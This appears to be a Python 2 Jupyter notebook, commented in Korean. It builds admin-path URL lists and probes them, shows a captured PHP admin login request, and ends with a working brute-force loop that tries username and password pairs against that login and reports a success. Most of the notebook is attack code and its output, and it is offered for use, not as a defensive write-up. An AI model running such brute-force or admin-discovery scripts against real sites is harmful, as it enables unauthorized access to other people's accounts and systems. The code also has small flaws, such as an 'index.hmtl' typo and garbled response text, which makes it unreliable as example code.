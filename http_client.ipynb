{
 "metadata": {
  "name": "",
  "signature": "sha256:01516582eeb3d4fd036f1356b326cc3140636c9bdfa1b636ea8d11a7a0331f46"
 },
 "nbformat": 3,
 "nbformat_minor": 0,
 "worksheets": [
  {
   "cells": [
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "# Requests\n",
      "- http://docs.python-requests.org/en/latest/"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "# HTTP GET \uc811\uc18d"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import requests\n",
      "\n",
      "def check_url(url):\n",
      "    \"\"\"\n",
      "    url \uc5d0 \uc811\uc18d\ud574\ubcf4\uace0, http status code \ub97c \ub9ac\ud134\ud55c\ub2e4. \n",
      "    \"\"\"\n",
      "    try:\n",
      "        response = requests.get(url)\n",
      "        #if (200 == response.status_code):    \n",
      "            #print 'headers'\n",
      "            #print '[headers]'\n",
      "            #for header in response.headers:\n",
      "            #    print '    {0} = {1}'.format(header, response.headers[header])\n",
      "            #print '[body]'\n",
      "            #print response.text\n",
      "        #else:\n",
      "            #print 'faild. status = {0}'.format(response.status_code)\n",
      "        return response.status_code\n",
      "    except requests.ConnectionError as e:\n",
      "        #print 'exception, {0}'.format(e)\n",
      "        return 404\n",
      "        \n",
      "url_list = \\\n",
      "    [\n",
      "        'http://www.google.com',\n",
      "        'http://www.google.com/not_exists.html'\n",
      "    ]        \n",
      "\n",
      "for url in url_list:\n",
      "    status_code = check_url(url)\n",
      "    if 200 == status_code:\n",
      "        print 'url = {0}, status_code = {1}, o'.format(url, status_code)\n",
      "    else:\n",
      "        print 'url = {0}, status_code = {1}, x'.format(url, status_code)\n",
      "    "
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "url = http://www.google.com, status_code = 200, o\n",
        "url = http://www.google.com/not_exists.html, status_code = 404, x"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n"
       ]
      }
     ],
     "prompt_number": 1
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "# URL \ubaa9\ub85d \uc0dd\uc131\n"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "_dirs = \\\n",
      "    [\n",
      "        'admin',\n",
      "        'administrator',\n",
      "        'manager',\n",
      "        'managment',\n",
      "    ]\n",
      "\n",
      "_file = \\\n",
      "    [\n",
      "        'index'\n",
      "    ]\n",
      "\n",
      "_ext = \\\n",
      "    [\n",
      "        'html'\n",
      "    ]\n",
      "    \n",
      "def create_url_list(base_url):\n",
      "    \"\"\"\n",
      "    \"\"\"\n",
      "    url_list = []\n",
      "    for dir in _dirs:\n",
      "        url = base_url + '/' + dir + '/' + 'index.hmtl'\n",
      "        url_list.append(url)\n",
      "        \n",
      "    return url_list\n",
      "    \n",
      "\n",
      "\n",
      "url_list = create_url_list('http://www.google.com')\n",
      "for url in url_list:\n",
      "    print url\n",
      "    \n",
      "    \n",
      "    \n",
      "    \n"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "http://www.google.com/admin/index.hmtl\n",
        "http://www.google.com/administrator/index.hmtl\n",
        "http://www.google.com/manager/index.hmtl\n",
        "http://www.google.com/managment/index.hmtl\n"
       ]
      }
     ],
     "prompt_number": 2
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "\n",
      "for url in url_list:\n",
      "    status_code = check_url(url)\n",
      "    if 200 == status_code:\n",
      "        print 'url = {0}, status_code = {1}, o'.format(url, status_code)\n",
      "    else:\n",
      "        print 'url = {0}, status_code = {1}, x'.format(url, status_code)\n"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "url = http://www.google.com/admin/index.hmtl, status_code = 404, x\n",
        "url = http://www.google.com/administrator/index.hmtl, status_code = 404, x"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n",
        "url = http://www.google.com/manager/index.hmtl, status_code = 404, x"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n",
        "url = http://www.google.com/managment/index.hmtl, status_code = 404, x"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n"
       ]
      }
     ],
     "prompt_number": 8
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "\n",
      "    POST /admin/admin/login_proc.php HTTP/1.1\n",
      "    Host: www.xxx.com\n",
      "    Proxy-Connection: keep-alive\n",
      "    Content-Length: 29\n",
      "    Cache-Control: max-age=0\n",
      "    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n",
      "    Origin: http://www.xxx.com\n",
      "    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36\n",
      "    Content-Type: application/x-www-form-urlencoded\n",
      "    Referer: http://www.xxx.com/admin/main/main.html\n",
      "    Accept-Encoding: gzip, deflate\n",
      "    Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4,ja;q=0.2\n",
      "    Cookie: log_cookie=today; PHPSESSID=b03ee6b66d8f59a1602be7a100412945\n",
      "\n",
      "    id=asdmin&x=26&y=15&pw=asdmin\n",
      "\n",
      "---\n",
      "\n",
      "    HTTP/1.1 200 OK\n",
      "    Date: Sat, 28 Feb 2015 07:30:10 GMT\n",
      "    Server: Apache/2.2.23 (Unix) mod_ssl/2.2.23 OpenSSL/1.0.0-fips PHP/5.3.19\n",
      "    X-Powered-By: PHP/5.3.19\n",
      "    Expires: Thu, 19 Nov 1981 08:52:00 GMT\n",
      "    Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\n",
      "    Pragma: no-cache\n",
      "    Content-Length: 418\n",
      "    Connection: close\n",
      "    Content-Type: text/html;charset=utf-8\n",
      "\n",
      "        <script type=\"text/javascript\">\n",
      "            alert(\"\u00eb\u00a1\u009c\u00ea\u00b7\u00b8\u00ec\u009d\u00b8 \u00ec\u00a0\u0095\u00eb\u00b3\u00b4\u00ea\u00b0\u0080 \u00ed\u008b\u0080\u00eb\u00a0\u00b8\u00ec\u008a\u00b5\u00eb\u008b\u0088\u00eb\u008b\u00a4.\u00ec\u008b\u009c\u00ec\u008a\u00a4\u00ed\u0085",
      "\u009c \u00ea\u00b4\u0080\u00eb\u00a6\u00ac\u00ec\u009e\u0090\u00ec\u0097\u0090\u00ea\u00b2\u008c \u00eb\u00ac\u00b8\u00ec\u009d\u0098 \u00ed\u0095\u0098\u00ec\u0084\u00b8\u00ec\u009a\u0094!\");\n",
      "            history.go(-1);</script>\n",
      "        <br />\n",
      "    <b>Warning</b>:  mysql_fetch_object(): supplied argument is not a valid MySQL result resource in <b>/home/seon/public_html/admin/admin/login_proc.php</b> on line <b>27</b><br />\n",
      "    <script>\n",
      "    window.location.href=\"admin_pw.php?menuBid=1&menuSid=0\";\n",
      "    </script>"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import requests\n",
      "\n",
      "def login(id, pw):\n",
      "    \"\"\"\n",
      "    id, pw \ub85c \ub85c\uadf8\uc778\uc744 \uc2dc\ub3c4\ud574 \ubcf4\uace0, \uc131\uacf5\ud558\uba74 True \ub97c \ub9ac\ud134\ud558\uace0, \n",
      "    \ub85c\uadf8\uc778 \uc2e4\ud328\uc2dc False \ub97c \ub9ac\ud134\ud55c\ub2e4. \n",
      "    \"\"\"\n",
      "    url = 'http://www.xxxx.com/admin/admin/login_proc.php'\n",
      "    payload = 'id={0}&x=26&y=15&pw={1}'.format(id, pw)    \n",
      "    header = {'content-type': 'application/x-www-form-urlencoded'}\n",
      "    response = requests.post(url, data = payload, headers = header)\n",
      "    if (200 == response.status_code):    \n",
      "        print 'headers'\n",
      "        print '[headers]'\n",
      "        for header in response.headers:\n",
      "            print '    {0} = {1}'.format(header, response.headers[header])\n",
      "            #print '[body]'\n",
      "            #print response.text\n",
      "    else:\n",
      "        print 'faild. status = {0}'.format(response.status_code)\n",
      "\n",
      "    \n",
      "    if response.status_code is 200 and response.text.find('history.go(-1)') is -1:\n",
      "        # ok, we got!\n",
      "        print url\n",
      "        print '[succeeded] id = {0}, pw = {1}'.format(id, pw)\n",
      "        return True\n",
      "    else:\n",
      "        print '[fail     ] id = {0}, pw = {1}'.format(id, pw)\n",
      "        return False\n",
      "    \n",
      "    \n",
      "id_list = ['adminstrator', 'admin']\n",
      "pw_list = ['pw123', 'abdddd123']\n",
      "\n",
      "found = False\n",
      "for id in id_list:\n",
      "    if True == found:\n",
      "        break;\n",
      "        \n",
      "    for pw in pw_list:\n",
      "        if True == login(id, pw):\n",
      "            found = True\n",
      "            break;\n",
      "            \n",
      "print 'brute force finished.'\n",
      "            \n",
      "        \n",
      "        "
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "headers\n",
        "[headers]\n",
        "    content-length = 1211\n",
        "    accept-ranges = bytes\n",
        "    strict-transport-security = max-age=172800\n",
        "    server = nginx\n",
        "    last-modified = Mon, 02 Mar 2015 00:17:56 GMT\n",
        "    connection = keep-alive\n",
        "    etag = \"54f3ac34-4bb\"\n",
        "    cache-control = public, max-age=604800s\n",
        "    date = Mon, 02 Mar 2015 00:45:34 GMT\n",
        "    x-frame-options = SAMEORIGIN\n",
        "    content-type = text/html\n",
        "http://www.xxxx.com/admin/admin/login_proc.php\n",
        "[succeeded] id = adminstrator, pw = pw123\n",
        "brute force finished.\n"
       ]
      }
     ],
     "prompt_number": 15
    }
   ],
   "metadata": {}
  }
 ]
}